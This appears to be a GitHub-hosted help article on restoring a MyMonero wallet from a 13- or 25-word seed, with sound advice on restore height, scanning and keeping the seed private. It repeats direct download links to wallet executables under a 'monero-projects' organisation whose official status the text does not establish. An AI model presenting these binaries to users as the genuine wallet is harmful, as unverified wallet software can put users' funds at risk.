<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">Restore a MyMonero Wallet</h1>
<p align="center">Recover access by restoring a compatible seed in MyMonero desktop or Cake Wallet.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
Restore a wallet by entering its valid recovery seed into a wallet that supports that seed format, then let the wallet scan from an appropriate restore height. Keep the seed private throughout; anyone who obtains it may control the funds.

## You'll see this if
- You installed MyMonero again or moved to a different device.
- Your wallet list is empty, or you need to access an existing wallet.
- You have either a 13-word MyMonero-specific legacy seed or a 25-word standard Monero seed.
- A restored wallet opens but shows an outdated or empty balance.

## Why it happens
A wallet is not restored from its display name or a previous device's app icon. The seed is the recovery information that lets compatible wallet software reconstruct access. MyMonero seeds can be 13 words (MyMonero-specific, legacy) or 25 words (standard Monero). Those formats are not interchangeable just because both look like lists of words. Identify the type you have and use a wallet that supports it; see [13-word MyMonero seed restore](./mymonero-13-word-seed-restore.md) and [25-word Monero seed migration](./mymonero-25-word-seed-migration.md).

MyMonero desktop final release v1.3.3 is on GitHub for Windows (.exe), macOS (.dmg), and Linux (.zip). The old desktop app can still open wallets and send XMR, but it is no longer maintained, with no new features or security updates. MyMonero hosted servers and web wallet login stopped. You can continue with the desktop app or restore the seed in Cake Wallet, which runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. See [restore options and migration](./mymonero-to-cake-wallet-migration.md).

A wallet may need to rescan blockchain history after restoration. Restore height tells it which block height to start scanning from. An earlier height is safer when unsure because it includes more history, but it takes longer. A height that is too recent can omit older activity from the displayed wallet history. Learn more in [MyMonero restore height explained](./mymonero-restore-height-explained.md).

---
## Fix
1. **Find the seed privately.** Locate the recovery words from your own secure backup. Do not paste them into a support chat, email, online form, search engine, or screenshot-sharing service. Nobody legitimate needs your seed to help restore a wallet.
2. **Count the words without exposing them.** Determine whether the backup has 13 words or 25 words. A 13-word seed is MyMonero-specific and legacy; a 25-word seed is the standard Monero format. Do not add, remove, or rearrange words to make one format resemble the other.
3. **Choose your wallet option.** You may use MyMonero desktop, whose final release is v1.3.3, or restore in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux. Windows desktop builds are paused at the time of writing. Get software only through its legitimate project distribution channels. Avoid pages that claim to restore your wallet by asking you to submit seed words online.
4. **Use the wallet's restore flow.** Open the wallet application you chose and select its option to restore or recover an existing wallet. Choose the seed format that matches your words if the application asks. Enter the words only inside the trusted wallet application on your own device. Follow the application's prompts without sharing the seed elsewhere.
5. **Check for entry mistakes locally.** If restoration rejects the seed, review your own written backup for legible spelling, word order, spacing, and count. Do not post individual words for public troubleshooting. For format-specific checks, see [MyMonero seed not accepted](./mymonero-seed-not-accepted.md).
6. **Set the restore height carefully.** If the wallet asks for a restore height and you know when the wallet was first used, choose a suitable starting point according to the wallet's guidance. If uncertain, use an earlier height rather than a later one. Earlier scanning is more complete but slower. A scan beginning too late can make old activity appear absent.
7. **Allow scanning to finish.** Keep the application open and online as needed while it checks history. A restored wallet can take time to show current activity. Avoid interpreting an incomplete scan as proof that funds are gone.
8. **Verify the result.** Confirm that the wallet address and history correspond to the wallet you intended to restore. Check incoming and outgoing transactions and distinguish total funds from locked or pending funds. Use [MyMonero balance shows zero](./mymonero-balance-shows-zero.md) if the displayed amount seems wrong.
9. **Protect the restored access.** Store the seed privately offline and secure the device. Do not send funds until you have checked the recipient, amount, and available balance. If you later move all funds, understand [sweeping funds to a new wallet](./mymonero-sweep-funds-new-wallet.md) first.

> [!TIP]
> Restore height is a scan starting point, not a new wallet password. Choosing an earlier point can take longer, but may help include older wallet activity.

---
## If that did not work
If the wallet says the seed is invalid, do not keep trying random word substitutions. Confirm whether the seed has 13 or 25 words and whether the wallet's restore method supports that exact format. Check the original backup carefully on your own. The behavior of recovery when a word is missing is not something to assume; never share partial seed words to ask strangers to reconstruct them.

If the wallet opens but has no visible transactions, it may still be scanning or may have started from a restore height that is too recent. Review the height and scan status, and consult [MyMonero transaction not showing](./mymonero-transaction-not-showing.md) and MyMonero not syncing. A server connection issue can affect scanning; error 523 is general guidance that the server connection is unavailable, not proof that the seed or funds are invalid.

The old MyMonero web wallet login is no longer available. Be cautious of anyone claiming to restore it through a replacement web login. If concerned about your seed's safety, do not disclose it; consider using a trusted wallet option and your own judgment about moving funds. For facts about the app's status, read MyMonero shutdown facts.

## Prevention
- Keep a legible, private offline backup of the full seed in its original order.
- Record whether the seed is 13-word MyMonero legacy or 25-word standard Monero.
- Never share a seed, private keys, or recovery words with a helper, exchange, or website.
- Keep the software source and restore process separate from unsolicited support messages.
- Record an appropriate restore height with your private wallet notes if useful, without including the seed.
- After restoration, allow scanning to complete before relying on the displayed balance.

## FAQ
<details><summary>Can I restore a MyMonero wallet in Cake Wallet?</summary>

Cake Wallet is the only alternative wallet named here. It runs on iOS, Android, macOS, and Linux. Check its current supported restore options and enter your seed only within the genuine application.

</details>

<details><summary>Are 13-word and 25-word seeds the same?</summary>

No. The 13-word MyMonero-specific seed is legacy, while 25 words is the standard Monero seed format. Use a compatible restore path for the format you have.

</details>

<details><summary>Will restoration immediately show every transaction?</summary>

Not necessarily. The wallet may need to scan history. Restore height controls where that scan begins, and an earlier height is safer but slower.

</details>

<details><summary>Can support restore my wallet if I send them the words?</summary>

No. Never share your seed. Nobody legitimate should ask for it; a person with the words may be able to control the wallet.

</details>

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero Balance Shows Zero](./mymonero-balance-shows-zero.md) | Check wallet selection, scanning, restore height, and connection before concluding funds are missing. |
| [MyMonero Transaction Not Showing](./mymonero-transaction-not-showing.md) | Troubleshoot missing incoming or outgoing activity without exposing wallet secrets. |
| [MyMonero Locked or Pending Balance](./mymonero-locked-pending-balance.md) | Understand why total funds and the amount available to send may differ. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
